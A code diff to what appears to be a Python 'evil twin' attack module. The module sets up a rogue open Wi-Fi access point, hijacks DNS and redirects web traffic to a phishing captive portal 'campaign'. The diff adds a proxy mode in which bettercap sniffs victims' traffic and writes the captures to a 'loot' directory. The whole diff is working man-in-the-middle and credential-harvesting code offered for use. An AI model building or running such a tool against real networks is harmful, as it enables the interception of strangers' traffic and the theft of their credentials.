@@ -4,10 +4,11 @@ Stands up:
   1. Static IP 192.168.45.1/24 on the chosen Wi-Fi interface.
   2. hostapd serving an open AP with the user's chosen SSID.
   3. dnsmasq doing DHCP for 192.168.45.10..100 and DNS-hijacking everything
-     to 192.168.45.1.
+     to 192.168.45.1 (or acting as a real DNS resolver in proxy mode).
   4. iptables NAT chain BIGBOX_CAPTIVE that redirects all TCP 80/443 from
-     the AP iface to the captive portal.
+     the AP iface to the captive portal (OR routes to the internet).
   5. CaptivePortal HTTP server on 192.168.45.1:80.
+  6. Optional: Bettercap for transparent proxying and traffic analysis.
 
 Tear down reverses the order. The iptables rules live in their own chain
 so cleanup never touches the user's existing firewall config.
@@ -42,6 +43,7 @@ DNSMASQ_LEASES = Path("/tmp/bigbox-dnsmasq.leases")
 DNSMASQ_PIDFILE = Path("/tmp/bigbox-dnsmasq.pid")
 HOSTAPD_LOG = Path("/tmp/bigbox-hostapd.log")
 DNSMASQ_LOG = Path("/tmp/bigbox-dnsmasq.log")
+BETTERCAP_LOG = Path("/tmp/bigbox-bettercap.log")
 
 IPT_CHAIN = "BIGBOX_CAPTIVE"
 
@@ -105,25 +107,30 @@ def _write_hostapd_conf(iface: str, ssid: str, channel: int = 6) -> None:
     HOSTAPD_CONF.write_text(body)
 
 
-def _write_dnsmasq_conf(iface: str) -> None:
-    body = (
-        f"interface={iface}\n"
-        "bind-interfaces\n"
-        "no-resolv\n"
-        "no-poll\n"
-        # Hand out DHCP from the AP_IP range.
-        f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},{DHCP_LEASE_TIME}\n"
-        f"dhcp-option=3,{AP_IP}\n"            # gateway
-        f"dhcp-option=6,{AP_IP}\n"            # dns server
-        f"dhcp-leasefile={DNSMASQ_LEASES}\n"
-        f"pid-file={DNSMASQ_PIDFILE}\n"
-        # DNS hijack: every name resolves to us.
-        f"address=/#/{AP_IP}\n"
-        # Cache-bust some captive-portal probe domains so iOS/Android
-        # always see a fresh response.
-        "no-hosts\n"
-    )
-    DNSMASQ_CONF.write_text(body)
+def _write_dnsmasq_conf(iface: str, is_proxy: bool = False) -> None:
+    body = [
+        f"interface={iface}",
+        "bind-interfaces",
+        f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},{DHCP_LEASE_TIME}",
+        f"dhcp-option=3,{AP_IP}",            # gateway
+        f"dhcp-option=6,{AP_IP}",            # dns server
+        f"dhcp-leasefile={DNSMASQ_LEASES}",
+        f"pid-file={DNSMASQ_PIDFILE}",
+        "no-hosts",
+    ]
+    
+    if is_proxy:
+        # In proxy mode, act as a real DNS forwarder
+        body.append("server=8.8.8.8")
+        body.append("server=1.1.1.1")
+    else:
+        # In captive portal mode, hijack everything
+        body.append("no-resolv")
+        body.append("no-poll")
+        body.append(f"address=/#/{AP_IP}")
+        
+    DNS_CONF = "\n".join(body) + "\n"
+    DNSMASQ_CONF.write_text(DNS_CONF)
 
 
 # ---------- iface + iptables ----------
@@ -137,50 +144,63 @@ def _set_iface_addr(iface: str) -> None:
     _run(["ip", "addr", "add", AP_CIDR, "dev", iface], timeout=5)
 
 
-def _install_iptables(iface: str) -> None:
+def _install_iptables(iface: str, is_proxy: bool = False, upstream: str | None = None) -> None:
     # Create an isolated chain so we can flush/delete only our rules later
-    # without touching the user's other firewall config.
     _run(["iptables", "-t", "nat", "-N", IPT_CHAIN], timeout=5)
     _run(["iptables", "-t", "nat", "-F", IPT_CHAIN], timeout=5)
 
-    # Redirect all TCP 80 / 443 from the AP iface into the chain, and from
-    # there DNAT to our captive portal on AP_IP:80.
-    _run(["iptables", "-t", "nat", "-A", "PREROUTING",
-          "-i", iface, "-p", "tcp", "--dport", "80",
-          "-j", IPT_CHAIN], timeout=5)
-    _run(["iptables", "-t", "nat", "-A", "PREROUTING",
-          "-i", iface, "-p", "tcp", "--dport", "443",
-          "-j", IPT_CHAIN], timeout=5)
-    _run(["iptables", "-t", "nat", "-A", IPT_CHAIN,
-          "-p", "tcp",
-          "-j", "DNAT", "--to-destination", f"{AP_IP}:80"], timeout=5)
-    # Allow the inbound HTTP to actually reach the portal process.
-    _run(["iptables", "-A", "INPUT", "-i", iface,
-          "-p", "tcp", "--dport", "80",
-          "-j", "ACCEPT"], timeout=5)
+    if is_proxy and upstream:
+        # Enable kernel IP forwarding
+        _run(["sysctl", "-w", "net.ipv4.ip_forward=1"], timeout=2)
+        
+        # Masquerade outbound traffic from the AP iface to the internet iface
+        _run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", upstream, "-j", "MASQUERADE"], timeout=5)
+        _run(["iptables", "-A", "FORWARD", "-i", iface, "-o", upstream, "-j", "ACCEPT"], timeout=5)
+        _run(["iptables", "-A", "FORWARD", "-i", upstream, "-o", iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"], timeout=5)
+        
+        # Optional: Redirect HTTP to local bettercap if bettercap is running as transparent proxy
+        # _run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", iface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "8080"], timeout=5)
+    else:
+        # Redirect all TCP 80 / 443 from the AP iface into the chain, and from
+        # there DNAT to our captive portal on AP_IP:80.
+        _run(["iptables", "-t", "nat", "-A", "PREROUTING",
+              "-i", iface, "-p", "tcp", "--dport", "80",
+              "-j", IPT_CHAIN], timeout=5)
+        _run(["iptables", "-t", "nat", "-A", "PREROUTING",
+              "-i", iface, "-p", "tcp", "--dport", "443",
+              "-j", IPT_CHAIN], timeout=5)
+        _run(["iptables", "-t", "nat", "-A", IPT_CHAIN,
+              "-p", "tcp",
+              "-j", "DNAT", "--to-destination", f"{AP_IP}:80"], timeout=5)
+        # Allow the inbound HTTP to actually reach the portal process.
+        _run(["iptables", "-A", "INPUT", "-i", iface,
+              "-p", "tcp", "--dport", "80",
+              "-j", "ACCEPT"], timeout=5)
 
 
-def _remove_iptables(iface: str) -> None:
+def _remove_iptables(iface: str, is_proxy: bool = False, upstream: str | None = None) -> None:
     # Remove our PREROUTING jumps to BIGBOX_CAPTIVE (might be one or two).
     for _ in range(4):
-        rc, _ = _run(["iptables", "-t", "nat", "-D", "PREROUTING",
-                      "-i", iface, "-p", "tcp", "--dport", "80",
-                      "-j", IPT_CHAIN], timeout=3)
-        if rc != 0:
-            break
-    for _ in range(4):
-        rc, _ = _run(["iptables", "-t", "nat", "-D", "PREROUTING",
-                      "-i", iface, "-p", "tcp", "--dport", "443",
-                      "-j", IPT_CHAIN], timeout=3)
-        if rc != 0:
-            break
+        _run(["iptables", "-t", "nat", "-D", "PREROUTING",
+              "-i", iface, "-p", "tcp", "--dport", "80",
+              "-j", IPT_CHAIN], timeout=3)
+        _run(["iptables", "-t", "nat", "-D", "PREROUTING",
+              "-i", iface, "-p", "tcp", "--dport", "443",
+              "-j", IPT_CHAIN], timeout=3)
+    
+    # Remove NAT rules if proxy was used
+    if is_proxy and upstream:
+        _run(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", upstream, "-j", "MASQUERADE"], timeout=3)
+        _run(["iptables", "-D", "FORWARD", "-i", iface, "-o", upstream, "-j", "ACCEPT"], timeout=3)
+        _run(["iptables", "-D", "FORWARD", "-i", upstream, "-o", iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"], timeout=3)
+        _run(["sysctl", "-w", "net.ipv4.ip_forward=0"], timeout=2)
+
     # Remove the INPUT allow rule.
     for _ in range(4):
-        rc, _ = _run(["iptables", "-D", "INPUT", "-i", iface,
-                      "-p", "tcp", "--dport", "80",
-                      "-j", "ACCEPT"], timeout=3)
-        if rc != 0:
-            break
+        _run(["iptables", "-D", "INPUT", "-i", iface,
+              "-p", "tcp", "--dport", "80",
+              "-j", "ACCEPT"], timeout=3)
+              
     # Flush + delete our private chain.
     _run(["iptables", "-t", "nat", "-F", IPT_CHAIN], timeout=3)
     _run(["iptables", "-t", "nat", "-X", IPT_CHAIN], timeout=3)
@@ -193,15 +213,18 @@ class EvilTwinSession:
     iface: str
     ssid: str
     channel: int = 6
-    skip_portal: bool = False
+    is_proxy: bool = False
     campaign: str = "generic"
 
     portal: Optional[CaptivePortal] = None
     hostapd_proc: Optional[subprocess.Popen] = None
     dnsmasq_proc: Optional[subprocess.Popen] = None
+    bettercap_proc: Optional[subprocess.Popen] = None
+    
     started_at: float = 0.0
     last_status: str = ""
     error: str = ""
+    internet_iface: Optional[str] = None
 
     # ---------- public ----------
     def start(self) -> tuple[bool, str]:
@@ -212,10 +235,10 @@ class EvilTwinSession:
             self.error = "dnsmasq not installed"
             return False, self.error
 
-        # 0. Kill any existing dnsmasq/hostapd that might be lingering from a
-        #    crashed session or another tool (DeadDrop, Honeypot).
+        # 0. Kill any existing dnsmasq/hostapd
         _run(["killall", "dnsmasq"], timeout=2)
         _run(["killall", "hostapd"], timeout=2)
+        _run(["killall", "bettercap"], timeout=2)
         time.sleep(0.5)
 
         # 1. Take iface away from NetworkManager + clean its addrs
@@ -224,15 +247,24 @@ class EvilTwinSession:
                  timeout=5)
         _flush_iface_addrs(self.iface)
         _set_iface_addr(self.iface)
+        
+        # 1.5 Detect internet for proxy mode
+        if self.is_proxy:
+            from bigbox import hardware
+            self.internet_iface = hardware.get_internet_iface()
+            if not self.internet_iface:
+                self.error = "Proxy mode requires an active internet connection on another interface."
+                self.stop()
+                return False, self.error
 
         # 2. Templates
         _write_hostapd_conf(self.iface, self.ssid, self.channel)
-        _write_dnsmasq_conf(self.iface)
+        _write_dnsmasq_conf(self.iface, is_proxy=self.is_proxy)
 
-        # 3. iptables NAT for the captive portal
-        _install_iptables(self.iface)
+        # 3. iptables
+        _install_iptables(self.iface, is_proxy=self.is_proxy, upstream=self.internet_iface)
 
-        # 4. dnsmasq (DHCP+DNS) — start before hostapd so leases are ready
+        # 4. dnsmasq (DHCP+DNS)
         try:
             self.dnsmasq_proc = subprocess.Popen(
                 ["dnsmasq", "--keep-in-foreground", "--conf-file=" + str(DNSMASQ_CONF)],
@@ -240,13 +272,12 @@ class EvilTwinSession:
                 stderr=subprocess.STDOUT,
                 stdin=subprocess.DEVNULL,
             )
-        except FileNotFoundError:
-            self.error = "dnsmasq not found in PATH"
+        except Exception as e:
+            self.error = f"dnsmasq failed: {e}"
             self.stop()
             return False, self.error
 
-        # Give dnsmasq a moment; if it died immediately, surface that.
-        time.sleep(0.4)
+        time.sleep(0.5)
         if self.dnsmasq_proc.poll() is not None:
             self.error = self._read_log_tail(DNSMASQ_LOG, "dnsmasq")
             self.stop()
@@ -260,8 +291,8 @@ class EvilTwinSession:
                 stderr=subprocess.STDOUT,
                 stdin=subprocess.DEVNULL,
             )
-        except FileNotFoundError:
-            self.error = "hostapd not found in PATH"
+        except Exception as e:
+            self.error = f"hostapd failed: {e}"
             self.stop()
             return False, self.error
 
@@ -271,8 +302,30 @@ class EvilTwinSession:
             self.stop()
             return False, self.error
 
-        # 6. Captive portal
-        if not self.skip_portal:
+        # 6. Captive portal OR Bettercap
+        if self.is_proxy:
+            # Bettercap Transparent Proxy
+            if shutil.which("bettercap"):
+                # We start bettercap and point it at the AP interface
+                cap_file = LOOT_DIR / f"bettercap_{int(time.time())}.cap"
+                LOOT_DIR.mkdir(parents=True, exist_ok=True)
+                cmd = [
+                    "bettercap", 
+                    "-iface", self.iface, 
+                    "-eval", f"set net.sniff.output {cap_file}; net.sniff on; net.show on; ticker on"
+                ]
+                try:
+                    self.bettercap_proc = subprocess.Popen(
+                        cmd,
+                        stdout=BETTERCAP_LOG.open("w"),
+                        stderr=subprocess.STDOUT,
+                        stdin=subprocess.DEVNULL,
+                    )
+                except Exception as e:
+                    self.last_status = f"AP Up, but Bettercap failed: {e}"
+            else:
+                self.last_status = f"AP Up (Normal NAT, no Bettercap)"
+        else:
             self.portal = CaptivePortal(ssid=self.ssid, campaign=self.campaign)
             ok, msg = self.portal.start()
             if not ok:
@@ -281,34 +334,32 @@ class EvilTwinSession:
                 return False, msg
 
         self.started_at = time.time()
-        self.last_status = f"AP '{self.ssid}' up on {self.iface}"
+        mode_str = "PROXY" if self.is_proxy else "PORTAL"
+        self.last_status = f"Evil Twin ({mode_str}) '{self.ssid}' active"
         return True, self.last_status
 
     def stop(self) -> None:
-        # Reverse order — portal -> hostapd -> dnsmasq -> iptables -> iface
         if self.portal:
-            try:
-                self.portal.stop()
-            except Exception:
-                pass
+            try: self.portal.stop()
+            except Exception: pass
             self.portal = None
 
-        for proc in (self.hostapd_proc, self.dnsmasq_proc):
+        for proc in (self.bettercap_proc, self.hostapd_proc, self.dnsmasq_proc):
             if proc and proc.poll() is None:
                 try:
                     proc.terminate()
                     proc.wait(timeout=2)
                 except Exception:
-                    try:
-                        proc.kill()
-                    except Exception:
-                        pass
+                    try: proc.kill()
+                    except Exception: pass
+        
+        self.bettercap_proc = None
         self.hostapd_proc = None
         self.dnsmasq_proc = None
 
         # iptables
         try:
-            _remove_iptables(self.iface)
+            _remove_iptables(self.iface, is_proxy=self.is_proxy, upstream=self.internet_iface)
         except Exception:
             pass
 
